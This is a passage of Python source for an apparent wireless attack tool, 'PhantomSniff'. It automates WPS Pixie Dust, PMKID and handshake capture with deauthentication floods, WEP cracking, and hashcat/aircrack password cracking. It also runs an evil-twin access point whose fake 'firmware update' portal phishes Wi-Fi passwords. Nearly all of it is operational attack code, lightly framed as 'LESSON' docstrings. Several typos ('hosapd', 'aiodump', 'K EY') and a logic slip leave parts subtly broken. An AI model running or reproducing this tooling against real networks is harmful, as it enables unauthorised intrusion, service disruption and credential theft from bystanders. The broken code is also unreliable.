        print("-" * 110)

    def select_target_interactive(self) -> Optional[Dict[str, Any]]:
        if not self.aps:
            return None
        self.display_table()
        n = len(self.aps)
        while True:
            try:
                choice = input(f"Select Target ID (1-{n}) or 'q': ").strip().lower()
                if choice == "q":
                    return None
                idx = int(choice)
                if 1 <= idx <= n:
                    return self.sorted_aps()[idx-1]
            except (ValueError, EOFError, KeyboardInterrupt):
                pass
            print(f"Invalid selection — enter a number between 1 and {n} or 'q'.")


# ---------------------------------------------------------------------------
# Support for attack modules
# ---------------------------------------------------------------------------

def _require_tools(tools: List[str]) -> bool:
    miss = DependencyManager.missing(tools)
    if miss:
        Log.err(f"Aborting: missing {', '.join(miss)}")
        return False
    return True


def _apply_timeouts(args, state: State) -> None:
    state.timeout_overrides = {}
    if not args.timeout:
        return
    for item in args.timeout:
        if "=" not in item:
            Log.warn(f"Bad --timeout '{item}' (expected ATTACK=SECS) — ignored.")
            continue
        k, v = item.split("=", 1)
        try:
            state.timeout_overrides[k.strip()] = int(v.strip())
        except ValueError:
            Log.warn(f"Non-integer timeout for {k} — ignored.")


def _get_timeout(state: State, attack: str) -> Optional[int]:
    ov = getattr(state, "timeout_overrides", {})
    if attack in ov:
        return ov[attack]
    key_map = {"pixie": "PIXIE_TIMEOUT", "pmkid": "PMKID_CAPTURE_TIME",
               "handshake": "HANDSHAKE_ROUND_TIME"}
    return CONFIG.get(key_map.get(attack, ""))


# ---------------------------------------------------------------------------
# Attack modules
# ---------------------------------------------------------------------------

def attack_pixie(state: State, target: Dict[str, Any], timeout: Optional[int] = None,
                 pin_timeout: Optional[int] = None) -> Dict[str, Any]:
    """LESSON: WPS Pixie Dust — offline PIN recovery attack on weak PRNGs."""
    if not _require_tools(["reaver", "pixiewps"]):
        return {"ok": False, "reason": "missing tools"}
    if not state.iface_manager or not state.iface_manager.verify():
        return {"ok": False, "reason": "monitor lost"}
    timeout = timeout or CONFIG["PIXIE_TIMEOUT"]
    pin_timeout = pin_timeout or CONFIG["PIN_FALLBACK_TIMEOUT"]
    bssid = target["bssid"]
    ch = target["channel"] or 1
    mon = state.mon_iface

    if not target.get("wps"):
        Log.warn("WPS not advertised; reaver will probe anyway.")

    Log.section(f"ATTACK: Pixie Dust vs {bssid}")
    Log.proto("Pixie attacks the PRNG used for E-S1/E-S2 in WPS. Offline and fast.")

    found_psk = None
    found_pin = None

    def _on_line(line: str):
        nonlocal found_psk, found_pin
        Log.verbose("reaver: " + line)
        m = re.search(r"WPA\s*PSK\s*:\s*['\"](.+?)['\"]", line)
        if m:
            found_psk = m.group(1)
            Log.ok(f"reaver reported PSK: {found_psk}")
        m = re.search(r"WPS\s*PIN\s*:\s*['\"](.+?)['\"]", line)
        if m:
            found_pin = m.group(1)

    cmd = ["reaver", "-i", mon, "-b", bssid, "-c", str(ch), "-K", "1", "-N", "-vv"]
    log_event(state, "pixie-dust", cmd_str(cmd), "running", f"timeout={timeout}s")
    res = stream_cmd(cmd, on_stdout=_on_line, timeout=timeout,
                     fix_hint="Check injection support.")

    if not found_psk:
        Log.warn("Pixie failed (likely patched AP). Falling back to timed online PIN attack.")
        cmd2 = ["reaver", "-i", mon, "-b", bssid, "-c", str(ch), "-vv", "-t", "3"]
        res2 = stream_cmd(cmd2, on_stdout=_on_line, timeout=pin_timeout)
        if not found_psk:
            Log.warn("Timed PIN fallback failed as well.")

    ok = bool(found_psk)
    if ok:
        state.credentials.append({
            "ts": now_str(), "source": "pixie",
            "target_bssid": bssid, "target_essid": target.get("essid"),
            "password": found_psk, "wps_pin": found_pin,
            "verified": False
        })
        Log.ok(f"PSK recovered via WPS: {found_psk}")
    else:
        Log.warn("Pixie double failed. Try PMKID or handshake.")
    log_event(state, "pixie-dust", cmd_str(cmd), "ok" if ok else "failed",
              f"psk={found_psk or 'none'} pin={found_pin or 'none'}")
    return {"ok": ok, "psk": found_psk, "pin": found_pin}


def _hcxdumptool_version_syntax() -> Optional[Tuple[List[str], str]]:
    res = run_cmd(["hcxdumptool", "--version"], timeOut=8, silent=True)
    blob = res.stdout + "\n" + res.stderr
    m = re.search(r"(\d+)\.", blob)
    major = int(m.group(1)) if m else None
    if major is None:
        return None
    if major >= 6:
        return (["--wlan=", "--out="], "v6")
    return (["-i", "-o"], "v5")


def attack_pmkid(state: State, target: Dict[str, Any], timeout: Optional[int] = None) -> Dict[str, Any]:
    """LESSON: PMKID capture — clientless, works without deauth."""
    if not _require_tools(["hcxdumptool", "hcxpcapngtool"]):
        return {"ok": False, "reason": "missing tools"}
    if not state.iface_manager or not state.iface_manager.verify():
        return {"ok": False, "reason": "monitor lost"}
    timeout = timeout or CONFIG["PMKID_CAPTURE_TIME"]
    bssid = target["bssid"]
    mon = state.mon_iface
    out_dir = state.captures_dir
    filterlist = out_dir / "filterlist_ap.txt"
    out_base = out_dir / "pmkid_capture"
    hashfile = out_dir / "pmkid.22000"

    syntax = _hcxdumptool_version_syntax()
    if not syntax:
        Log.err("Cannot determine hcxdumptool version.")
        return {"ok": False, "reason": "unknown version"}
    flags, label = syntax
    Log.section(f"ATTACK: PMKID vs {bssid} — hcxdumptool {label}")

    filterlist.write_text(bssid.lower() + "\n")
    cmd_v5 = ["hcxdumptool", "-i", mon, "--filterlist_ap=" + str(filterlist),
              "--filtermode=2", "--enable_status=1", "-o", str(out_base)]
    cmd_v6 = ["hcxdumptool", "--wlan=" + mon, "--filterlist_ap=" + str(filterlist),
              "--filtermode=2", "--enable_status=1", "--out=" + str(out_base)]
    cmd = cmd_v6 if flags[0].startswith("--") else cmd_v5
    log_event(state, "pmkid-capture", cmd_str(cmd), "running", f"{timeout}s window")

    Log.info(f"Capturing PMKID for {timeout}s ...")
    proc = spawn_background(state, cmd, log_path=out_dir / "hcxdumptool.log")
    time.sleep(timeout)
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except (ProcessLookupError, PermissionError):
        pass
    time.sleep(2)

    pcap = out_base.with_suffix(".pcapng")
    if not pcap.exists():
        for cand in out_dir.glob("pmkid_capture*"):
            if cand.suffix == ".pcapng":
                pcap = cand
                break
    if not pcap.exists() or pcap.stat().st_size == 0:
        Log.warn("No pcapng produced — AP may be rejecting PMKID.")
        log_event(state, "pmkid-capture", cmd_str(cmd), "no-data", "ap rejected")
        return {"ok": False, "reason": "no pcapng"}

    # P1: ALWAYS convert before cracking
    conv = run_cmd(["hcxpcapngtool", "-o", str(hashfile), str(pcap)], timeOut=60,
                   fix_hint="hcxpcapngtool is in hcxtools; verify it can read the pcapng.")
    log_event(state, "pmkid-convert", cmd_str(["hcxpcapngtool", "-o", str(hashfile), str(pcap)]),
              "ok" if conv.ok else "failed", "")
    if not hashfile.exists():
        Log.warn("hcxpcapngtool wrote no hash file.")
        return {"ok": False, "reason": "no hash"}

    lines = [l.strip() for l in hashfile.read_text(errors="replace").splitlines() if l.strip()]
    valid = [l for l in lines if validate_22000_line(l)]
    Log.ok(f"Converted {len(lines)} lines, {len(valid)} valid 22000 lines.")
    if not valid:
        return {"ok": False, "reason": "no valid hashes"}
    state.pmkid_hash = hashfile
    log_event(state, "pmkid-result", "", "ok", f"{len(valid)} valid hashes")
    return {"ok": True, "hash_file": str(hashfile), "lines": len(valid)}


def validate_22000_line(line: str) -> bool:
    parts = line.split("*")
    if len(parts) < 4:
        return False
    if not re.fullmatch(r"[0-9a-fA-F]{32}", parts[0]):
        return False
    for mac in parts[1:3]:
        if not re.fullmatch(r"[0-9a-fA-F]{12}", mac):
            return False
    return True


def attack_handshake(state: State, target: Dict[str, Any], client: Optional[str] = None,
                     rounds: int = None, round_time: int = None) -> Dict[str, Any]:
    """LESSON: WPA 4-way handshake — M2/M4 carry crackable MIC."""
    if not _require_tools(["airodump-ng", "aireplay-ng", "aircrack-ng"]):
        return {"ok": False, "reason": "missing tools"}
    if not state.iface_manager or not state.iface_manager.verify():
        return {"ok": False, "reason": "monitor lost"}
    rounds = rounds or CONFIG["MAX_DEAUTH_ROUNDS"]
    round_time = round_time or CONFIG["HANDSHAKE_ROUND_TIME"]
    bssid = target["bssid"]
    ch = target["channel"] or 1
    mon = state.mon_iface
    prefix = state.captures_dir / "handshake"
    cap = state.captures_dir / "handshake-01.cap"

    pmf = target.get("pmf", "unknown")
    if pmf == "required":
        Log.warn("Target REQUIRES PMF — deauth will be dropped.")
    elif pmf == "unknown":
        Log.warn("PMF status unknown — deauth may fail. Best-effort.")
    if target.get("sae_only"):
        Log.err("Target is WPA3-only (SAE). Refusing handshake attack (P4).")
        return {"ok": False, "reason": "WPA3-only target"}

    Log.section(f"ATTACK: Handshake vs {bssid} (up to {rounds} rounds)")
    Log.proto("M2/M4 contain MIC = crackable material; need M1+M2/M4.")

    airodump_cmd = ["airodump-ng", mon, "--bssid", bssid, "-c", str(ch),
                    "-w", str(prefix), "--write-format", "cap", "--write-interval", "1",
                    "--band", "abg"]
    proc = spawn_background(state, airodump_cmd, log_path=state.captures_dir / "airodump-handshake.log")

    captured = False
    details = ""
    for rnd in range(1, rounds + 1):
        Log.info(f"Round {rnd}/{rounds}: deauthing ...")
        if client:
            dea_cmd = ["aireplay-ng", "-0", "5", "-a", bssid, "-c", client.upper(), mon]
        else:
            dea_cmd = ["aireplay-ng", "-0", "5", "-a", bssid, mon]
        r1 = run_cmd(dea_cmd, timeOut=15, silent=False)
        log_event(state, "deauth", cmd_str(dea_cmd), "ok" if r1.ok else "failed", f"round {rnd}")
        if not r1.ok:
            Log.warn("aireplay-ng deauth issue; trying mdk4")
            mdk4_cmd = ["mdk4", mon, "d", "-B", bssid]
            r1b = run_cmd(mdk4_cmd, timeOut=15, silent=True)
            log_event(state, "deauth-mdk4", cmd_str(mdk4_cmd), "ok" if r1b.ok else "failed", "")
        time.sleep(round_time)
        if cap.exists():
            ok, det = verify_handshake_in_pcap(cap, bssid, client)
            if ok:
                captured = True
                details = f"round {rnd}: {det}"
                Log.ok(f"Handshake verified in round {rnd}: {det}")
                break
            Log.warn(f"Round {rnd}: no M1+M2/M4 yet.")

    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except (ProcessLookupError, PermissionError):
        pass
    time.sleep(2)

    if not captured:
        Log.err(f"No handshake after {rounds} rounds. If PMF is on, expected.")
        log_event(state, "handshake", "", "failed", f"{rounds} rounds exhausted")
        return {"ok": False, "reason": "no handshake"}
    state.handshake_cap = cap
    log_event(state, "handshake", "", "captured", details)
    return {"ok": True, "cap": str(cap), "detail": details}


def verify_handshake_in_pcap(path: Path, bssid: str, client_mac: Optional[str] = None) -> Tuple[bool, str]:
    bssid = bssid.upper()
    if client_mac:
        client_mac = client_mac.upper()
    saw_ap = False
    saw_m2 = False
    saw_m4 = False
    m2_from = None
    try:
        with PcapReader(str(path)) as pr:
            for pkt in pr:
                if not pkt.haslayer(EAPOL):
                    continue
                if pkt[EAPOL].type != 3:
                    continue
                key = pkt.getlayer(EAPOLKey)
                if key is None:
                    continue
                addr2 = (getattr(pkt, "addr2", "") or "")
                addr3 = (getattr(pkt, "addr3", "") or "")
                if addr2.upper() != bssid and addr3.upper() != bssid:
                    continue
                ki = key.key_information | 0
                ack = bool(ki & 0x0010)
                mic = bool(ki & 0x0020)
                nonce = bytes(key.nonce)
                if addr2.upper() == bssid and ack and not mic:
                    saw_ap = True
                    Log.verbose(f"EAPOL M1/M3 from AP {addr2}")
                elif addr2.upper() != bssid and mic and not ack:
                    if client_mac and addr2.upper() != client_mac:
                        continue
                    if any(nonce):
                        saw_m2 = True
                        m2_from = addr2
                        Log.verbose(f"captured EAPOL M2 from client {addr2}")
                    else:
                        saw_m4 = True
                if saw_ap and (saw_m2 or saw_m4):
                    break
    except Exception as e:
        Log.warn(f"PcapReader error: {e}")
        return False, "pcap read error"
    if saw_ap and (saw_m2 or saw_m4):
        return True, f"(AP frame M1/M3 + M2/M4 confirmed (M2 from {m2_from or '?'})"
    return False, f"AP frames={'yes' if saw_ap else 'no'}, M2/M4={'yes' if saw_m2 or saw_m4 else 'no'}"


# ---------------------------------------------------------------------------
# Evil Twin
# ---------------------------------------------------------------------------

class EvilTwinPortal(http.server.BaseHTTPRequestHandler):
    # class var set before serving
    server_state: Dict[str, Any] = None

    def _send_html(self, body: str, code: int = 200):
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        try:
            self.wfile.write(body.encode("utf-8"))
        except BrokenPipeError:
            pass

    def do_GET(self):
        st = self.server_state
        if st.get("any_verified"):
            body = "<html><body><h2>Device up to date</h2><p>Firmware updated successfully.</p></body></html>"
        else:
            body = ("""<html><body><h2>Firmware Update Required</h2>
                <p>Your router firmware is out of date. Enter your Wi-Fi password
                to apply the update.</p>
                <form method=POST action=/><input type=password name=password
                placeholder='Wi-Fi password' autofocus><button>Update</button></form>
                </body></html>""")
        self._send_html(body)

    def do_POST(self):
        st = self.server_state
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length).decode("utf-8", errors="replace")
        m = re.search(r"password=([^&]*)", raw)
        if not m:
            self._send_html("<html><body><p>Bad request.</p></body></html>", 400)
            return
        import urllib.parse
        password = urllib.parse.unquote_plus(m.group(1)).strip()
        if not password:
            self._send_html("<html><body><p>Empty password — try again.</p></body></html>", 400)
            return
        client_ip = self.client_address[0]
        client_mac = st["resolver"](client_ip)
        with st["lock"]:
            st["creds"][password] = {"ts": now_str(), "client_ip": client_ip,
                                     "client_mac": client_mac}
            st["pending"].put(password)
        Log.info(f"Portal credential received from {client_mac or client_ip}: {password}")
        self._send_html(
            "<html><body><h2>Checking...</h2><p>Your password is being verified.</p>"
            "<meta http-equiv=refresh content=3></body></html>")


def _dnsmasq_mac_resolver(lease_path: Path, ip: str) -> Optional[str]:
    try:
        if lease_path.exists():
            for line in lease_path.read_text(errors="replace").splitlines():
                parts = line.split()
                if len(parts) >= 3 and parts[2] == ip:
                    return parts[1].upper()
    except OSError as e:
        Log.verbose(f"lease read error: {e}")
    return None


def attack_eviltwin(state: State, target: Dict[str, Any], essid: Optional[str] = None,
                    ap_iface: Optional[str] = None, port: int = None) -> Dict[str, Any]:
    """LESSON: Evil Twin — association by ESSID, DHCP/DNS redirection, portal."""
    if not _require_tools(["hosapd", "dnsmasq", "aircrack-ng"]):
        return {"ok": False, "reason": "missing tools"}
    if not state.iface_manager or not state.iface_manager.verify():
        return {"ok": False, "reason": "monitor lost"}

    essid = essid or target.get("essid") or "PhantomSniffLab"
    bssid = target["bssid"]
    ch = target["channel"] or 1
    port = CONFIG["EVIL_TWIN_PORT"]
    ws = state.workspace
    hostapd_cfg = ws / "eviltwin-hostapd.conf"
    dnsmasq_cfg = ws / "eviltwin-dnsmasq.conf"
    lease_path = Path("/var/lib/misc/dnsmasq.leases")

    # Guarantee a handshake for verification
    if not state.handshake_cap:
        Log.warn("No handshake captured yet — capturing a quick one so portal can verify.")
        hs = attack_handshake(state, target, rounds=2, round_time=15)
        if not hs["ok"]:
            Log.warn("No handshake — portal will capture but cannot verify.")
            state.credential_verify_possible = False
        state.credential_verify_possible = True

    ap_iface = ap_iface or state.orig_iface
    if not ap_iface or ap_iface == state.mon_iface:
        ap_iface = state.orig_iface  # hope it's back
    if state.mon_iface:
        run_cmd(["airmon-ng", "stop", state.mon_iface], timeOut=30, silent=True)
        state.mon_iface = None

    Log.section(f"EVIL TWIN: '{essid}' on {ap_iface} ch{ch}")

    security_lines = []
    privacy = (target.get("privacy") or "").upper()
    if "WEP" in privacy:
        pass  # leave empty (open) — if user wants WEP twin, they'll configure manually
    elif "OPN" in privacy:
        pass
    else:
        security_lines = ["wpa=2", "wpa_passphrase=ThisIsTestLabPass12345",
                          "wpa_key_mgmt=WPA-PSK", "rsn_pairwise=CCMP", "wpa_pairwise=CCMP"]

    hostapd_cfg.write_text("\n".join([
        "interface=" + ap_iface,
        "driver=nl80211",
        "ssid=" + essid,
        "hw_mode=g",
        "channel=" + str(ch),
        "auth_algs=1",
        "ignore_broadcast_ssid=0",
    ] + security_lines) + "\n")

    dnsmasq_cfg.write_text("\n".join([
        f"interface={ap_iface}",
        "bind-interfaces",
        f"dhcp-range={CONFIG['EVIL_TWIN_DHCP_START']},{CONFIG['EVIL_TWIN_DHCP_END']},12h",
        f"dhcp-option=3,{CONFIG['EVIL_TWIN_IP']}",
        f"dhcp-option=6,{CONFIG['EVIL_TWIN_IP']}",
        f"address=/#/{CONFIG['EVIL_TWIN_IP']}",
        "no-resolv",
        "log-dhcp",
    ]) + "\n")

    # bring up interface and assign IP (flush first)
    run_cmd(["ip", "link", "set", ap_iface, "up"], timeOut=10)
    run_cmd(["ip", "addr", "flush", "dev", ap_iface], timeOut=10, silent=True)
    ip_add = run_cmd(["ip", "addr", "add", f"{CONFIG['EVIL_TWIN_IP']}/24", "dev", ap_iface],
                     timeOut=10, silent=False)
    if not ip_add.ok:
        Log.err("Failed to assign portal IP.")
        return {"ok": False, "reason": "ip assign failed"}

    proc_h = spawn_background(state, ["hosapd", str(hostapd_cfg)],
                              log_path=ws / "hostapd.log")
    proc_d = spawn_background(state, ["dnsmasq", "-C", str(dnsmasq_cfg),
                             "--dhcp-leasefile=" + str(lease_path)],
                             log_path=ws / "dnsmasq.log")
    time.sleep(4)
    res = run_cmd(["pgrep", "-f", "hosapd.*" + str(hostapd_cfg)], timeOut=5, silent=True)
    if res.rc != 0:
        Log.err("hosapd not running. Check " + str(ws / "hostapd.log"))
        return {"ok": False, "reason": "hostapd died"}

    # Portal state
    portal_state = {
        "creds": {},
        "pending": queue.Queue(),
        "lock": threading.Lock(),
        "any_verified": False,
        "resolver": lambda ip: _dnsmasq_mac_resolver(lease_path, ip) or "unknown",
    }
    EvilTwinPortal.server_state = portal_state
    httpd = socketserver.ThreadingTCPServer(("0.0.0.0", port), EvilTwinPortal)
    httpd.daemon_threads = True

    def verifier():
        while True:
            pw = portal_state["pending"].get()
            if not pw:
                continue
            if not state.handshake_cap:
                continue
            tmp = ws / "portal-pass.txt"
            tmp.write_text(pw + "\n")
            r = run_cmd(["aircrack-ng", "-w", str(tmp), "-b", target["bssid"],
                         str(state.handshake_cap)], timeOut=60, silent=True)
            m = re.search(r"K EY\s*FOUND\s*\[.*?\]([^\n]*)", r.stdout + r.stderr)
            if m:
                Log.ok(f"Verified password: {pw}")
                portal_state["any_verified"] = True
                portal_state["creds"][pw]["verified"] = True
            else:
                Log.info(f"Password not verified: {pw}")
                portal_state["creds"][pw]["verified"] = False

    threading.Thread(target=verifier, daemon=True).start()
    Log.info(f"Captive portal at 0.0.0.0:{port}. Connect a client to '{essid}'.")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        Log.info("Portal stopped.")
    finally:
        httpd.server_close()

    for pw, meta in portal_state["creds"].items():
        state.credentials.append({
            "ts": meta["ts"], "source": "eviltwin",
            "target_bssid": bssid, "target_essid": essid,
            "client_ip": meta["client_ip"], "client_mac": meta["client_mac"],
            "password": pw, "verified": meta.get("verified", False)
        })
    return {"ok": bool(portal_state["creds"]), "creds": len(portal_state["creds"])}


# ---------------------------------------------------------------------------
# WEP attack (optional)
# ---------------------------------------------------------------------------

def attack_wep(state: State, target: Dict[str, Any], timeout: Optional[int] = None,
              max_ivs: int = None) -> Dict[str, Any]:
    """LESSON: WEP PTW — IV reuse & ARP replay."""
    if not _require_tools(["airodump-ng", "aireplay-ng", "aircrack-ng"]):
        return {"ok": False, "reason": "missing tools"}
    if not state.iface_manager or not state.iface_manager.verify():
        return {"ok": False, "reason": "monitor lost"}
    timeout = timeout or CONFIG["WEP_CAPTURE_TIMEOUT"]
    max_ivs = max_ivs or CONFIG["WEP_MAX_IVS"]
    bssid = target["bssid"]
    mon = state.mon_iface
    prefix = state.captures_dir / "wep"
    cap = state.captures_dir / "wep-01.cap"

    Log.section(f"ATTACK: WEP PTW vs {bssid}")
    Log.proto("ARP replay generates fresh IVs; PTW recovers key.")

    airodump = spawn_background(state, ["airodump-ng", mon, "--bssid", bssid,
                                 "-c", target["channel"] or 1, "-w", str(prefix),
                                 "--write-format", "cap", "--write-interval", "1", "--band", "abg"],
                                 log_path=state.captures_dir / "airodump-wep.log")
    time.sleep(3)
    run_cmd(["aireplay-ng", "--fakeauth", "0", "-a", bssid, mon], timeOut=20)
    replay = spawn_background(state, ["aireplay-ng", "--arpreplay", "-b", bssid, mon],
                              log_path=state.captures_dir / "arpreplay-wep.log")
    Log.info(f"AR P replay running; waiting for >= {max_ivs} IVs or {timeout}s ...")
    deadline = time.time() + timeout
    ivs = 0
    while time.time() < deadline:
        time.sleep(5)
        csvp = state.captures_dir / "wep-01.csv"
        if csvp.exists():
            try:
                with open(csvp, newline="", errors="replace") as fh:
                    for row in csv.reader(fh):
                        if len(row) >= 11 and row[0].strip().upper() == bssid:
                            iv_s = row[10].strip()
                            if iv_s.isdigit():
                                ivs = int(iv_s)
            except (OSError, ValueError):
                pass
        Log.verbose(f"IVs: {ivs}")
        if ivs >= max_ivs:
            break
    for p in (aiodump, replay):
        try:
            os.killpg(os.getpgid(p.pid), signal.SIGTERM)
        except (ProcessLookupError, PermissionError):
            pass
    time.sleep(2)
    if not cap.exists():
        Log.err("No capture.")
        return {"ok": False, "reason": "no cap"}
    r = run_cmd(["aircrack-ng", "-b", bssid, str(cap)], timeOut=120,
                fix_hint="PTW always needs enough IVs; run longer or chann.")
    m = re.search(r"K EY\s*FOUND\s*\[\s*([0-9A-F:]+)\s*\]", r.stdout + r.stderr)
    if m:
        key = m.group(1).strip()
        Log.ok(f"WEP key: {key}")
        state.credentials.append({
            "ts": now_str(), "source": "wep", "target_bssid": bssid,
            "target_essid": target.get("essid"), "password": key, "verified": True
        })
        return {"ok": True, "key": key}
    Log.warn("PTW failed.")
    return {"ok": False, "reason": "PTW failed"}


# ---------------------------------------------------------------------------
# Deauth
# ---------------------------------------------------------------------------

def attack_deauth(state: State, target: Dict[str, Any], client: Optional[str] = None,
                  count: int = 5) -> Dict[str, Any]:
    if not _require_tools(["aireplay-ng", "mdk4"]):
        return {"ok": False, "reason": "missing tools"}
    if not state.iface_manager or not state.iface_manager.verify():
        return {"ok": False, "reason": "monitor lost"}
    bssid = target["bssid"]
    mon = state.mon_iface
    pmf = target.get("pmf", "unknown")
    if pmf == "required":
        Log.warn("PMF required — deauth will be dropped.")
    elif pmf == "unknown":
        Log.warn("PMF unknown — deauth may fail.")
    Log.section(f"DEAUTH vs {bssid}" + (f" client {client}" if client else " broadcast"))
    cmd = ["aireplay-ng", "-0", str(count), "-a", bssid]
    if client:
        cmd += ["-c", client.upper()]
    else:
        cmd += ["--ignore-negative-one"]
    cmd.append(mon)
    r = run_cmd(cmd, timeOut=30)
    if not r.ok:
        Log.warn("aireplay failed; trying mdk4")
        r2 = run_cmd(["mdk4", mon, "d", "-B", bssid] + (["-C", client.upper()] if client else []),
                     timeOut=30, silent=True)
    return {"ok": r.ok}


# ---------------------------------------------------------------------------
# Attack registry
# ---------------------------------------------------------------------------

ATTACK_REGISTRY = {
    "pixie": {
        "name": "wps-pixie",
        "func": attack_pixie,
        "skip_reason": lambda t: None if t.get("wps") or True else None,
    },
    "pmkid": {
        "name": "pmkid capture",
        "func": attack_pmkid,
        "skip_reason": lambda t: None,
    },
    "handshake": {
        "name": "4-way handshake",
        "func": attack_handshake,
        "skip_reason": lambda t: "WPA3-only" if t.get("sae_only") else None,
    },
    "eviltwin": {
        "name": "evil twin",
        "func": attack_eviltwin,
        "skip_reason": lambda t: None,
    },
    "wep": {
        "name": "WEP PTW",
        "func": attack_wep,
        "skip_reason": lambda t: None if "WEP" in (t.get("privacy") or "").upper() else "Not WEP",
    },
    "deauth": {
        "name": "deauth",
        "func": attack_deauth,
        "skip_reason": lambda t: None,
    },
}


# ---------------------------------------------------------------------------
# CrackEngine
# ---------------------------------------------------------------------------

class CrackEngine:
    ROCKYOU_PATHS = [
        "/usr/share/worldlists/rockyou.txt",
        "/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt",
        "/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
    ]

    def __init__(self, state: State):
        self.state = state
        self.potfile = state.workspace / "hashcat.pot"

    def find_wordlist(self, explicit: Optional[Path] = None) -> Optional[Path]:
        if explicit:
            p = Path(explicit)
            if not p.exists():
                Log.err(f"Wordlist not found: {p}")
                return None
            return self._validate_wordlist(p)
        for cand in self.ROCKYOU_PATHS:
            p = Path(cand)
            if p.exists():
                return self._validate_wordlist(p)
        Log.err("No wordlist found. Use -w path or install rockyou.")
        return None

    def _validate_wordlist(self, p: Path) -> Optional[Path]:
        if p.stat().st_size < CONFIG["WORDLIST_MIN_SIZE"]:
            Log.err(f"Wordlist too small: {p}")
            return None
        if p.suffix == ".gz":
            out = self.state.workspace / "rockyou.txt"
            run_cmd(["gzip", "-dk", str(p)], timeOut=120, silent=True)
            if not out.exists():
                raw = p.with_suffix("")
                if raw.exists():
                    out = raw
                else:
                    return None
            p = out
        try:
            with open(p, "r", errors="replace") as fh:
                line = fh.readline().strip()
                if not line or len(line) > 64:
                    Log.err("Wordlist appears invalid.")
                    return None
        except OSError as e:
            Log.err(f"Error reading {p}: {e}")
            return None
        return p

    def convert_to_22000(self, cap: Path) -> Optional[Path]:
        out = self.state.workspace / "converted.22000"
        Log.info("Converting cap to 22000 ...")
        r = run_cmd(["hcxpcapngtool", "-o", str(out), str(cap)], timeOut=120,
                    fix_hint="hcxtools must be installed.")
        if not out.exists():
            return None
        with open(out) as f:
            lines = [l.strip() for l in f if l.strip()]
        valid = [l for l in lines if validate_22000_line(l)]
        if not valid:
            return None
        return out

    def has_opencl(self) -> bool:
        r = run_cmd(["hashcat", "-I"], timeOut=30, silent=True)
        if not r.ok:
            return False
        return bool(re.search(r"Number of devices:\s*[1-9]", r.stdout))

    def crack_with_hashcat(self, hashfile: Path, wordlist: Optional[Path] = None,
                           mask: Optional[str] = None, rule: Optional[Path] = None,
                           threads: int = 2) -> Dict[str, Any]:
        cmd = ["hashcat", "-m", "22000", str(hashfile),
               "--potfile-path", str(self.potfile), "-w", str(max(1, min(threads, 4)))]
        if mask:
            cmd += ["-a", "3", mask]
        elif wordlist:
            cmd += ["-a", "0", str(wordlist)]
        else:
            cmd += ["-a", "3", "?d?d?d?d?d?d?d?d"]
        if rule:
            cmd += ["-r", str(rule)]

        if not self.has_opencl():
            Log.err("No OpenCL devices. Install pocl: sudo apt install -y pocl-opencl-icd")
            Log.warn("Retrying once with --force...")
            r1 = run_cmd(cmd + ["--force"], timeOut=CONFIG["HASHCAT_CPU_TIMEOUT"], silent=True)
        else:
            r1 = run_cmd(cmd, timeOut=CONFIG["HASHCAT_GPU_TIMEOUT"], silent=True)

        cracked = self._cred_from_pot(hashfile)
        if cracked:
            return {"ok": True, "password": cracked, "engine": "hashcat"}
        return {"ok": False, "reason": "hashcat no result"}

    def _cred_from_pot(self, hashfile: Path) -> Optional[str]:
        if not self.potfile.exists():
            return None
        prefix = None
        try:
            first = next(l for l in hashfile.read_text(errors="replace").splitlines() if l.strip())
            prefix = first.split("*")[0].upper()
        except (StopIteration, OSError):
            return None
        for line in self.potfile.read_text(errors="replace").splitlines():
            if ":" in line and line.split(":", 1)[0].strip().upper() == prefix:
                return line.split(":", 1)[1].strip()
        return None

    def crack_with_aircrack(self, cap: Path, bssid: str, wordlist: Path) -> Dict[str, Any]:
        Log.info("Falling back to aircrack-ng.")
        found = {"password": None}
        def _line(line):
            Log.verbose(line)
            m = re.search(r"K EY\s*FOUND!\s*\[\s*([^\]]+)\s*\]", line)
            if m:
                found["password"] = m.group(1).strip()
        stream_cmd(["aircrack-ng", "-w", str(wordlist), "-b", bssid, str(cap)],
                   on_stdout=_line, timeout=CONFIG["HASHCAT_CPU_TIMEOUT"])
        if found["password"]:
            return {"ok": True, "password": found["password"], "engine": "aircrack-ng"}
        return {"ok": False, "reason": "aircrack no key"}

    def crack(self, state: State, wordlist: Optional[Path] = None, mask: Optional[str] = None,
              rule: Optional[Path] = None, threads: int = 2) -> Dict[str, Any]:
        # Try hashcat if we have a 22000 hash
        if state.pmkid_hash and state.pmkid_hash.exists():
            wl = self.find_wordlist(wordlist)
            r = self.crack_with_hashcat(state.pmkid_hash, wl if wl else None, mask, rule, threads)
            if r["ok"]:
                state.credentials.append({
                    "ts": now_str(), "source": "hashcat",
                    "target_bssid": (state.target or {}).get("bssid"),
                    "password": r["password"], "verified": True
                })
                return r

        # Or aircrack on cap
        if state.handshake_cap and state.handshake_cap.exists():
            wl = self.find_wordlist(wordlist)
            if wl:
                r = self.crack_with_aircrack(state.handshake_cap,
                                             (state.target or {}).get("bssid", ""), wl)
                if r["ok"]:
                    state.credentials.append({
                        "ts": now_str(), "source": "aircrack-ng",
                        "target_bssid": (state.target or {}).get("bssid"),
                        "password": r["password"], "verified": True
                    })
                    return r
        Log.warn("Nothing to crack.")
        return {"ok": False, "reason": "no material"}


# ---------------------------------------------------------------------------
# Report
# ---------------------------------------------------------------------------

class Report:
    def __init__(self, state: State):
        self.state = state

    def build(self) -> Dict[str, Any]:
        st = self.state
        return {
            "tool": f"PhantomSniff {VERSION}",
            "generated": now_str(),
            "run_started": st.start_time.strftime("%Y-%m-%d %H:%M:%S"),
            "interfaces": {"orig": st.orig_iface, "monitor": st.mon_iface},
            "target": st.target,
            "tool_versions": st.tool_versions,
            "timeline": st.timeline,
            "credentials": st.credentials,
            "errors": st.errors,
            "artifacts": {
                "handshake_cap": str(st.handshake_cap) if st.handshake_cap else None,
                "pmkid_hash": str(st.pmkid_hash) if st.pmkid_hash else None,
                "workspace": str(st.workspace),
            }
        }

    def write_json(self, path: Optional[Path] = None) -> Path:
        path = path or (self.state.workspace / "report.json")
        path.write_text(json.dumps(self.build(), indent=2))
        Log.ok(f"JSON report: {path}")
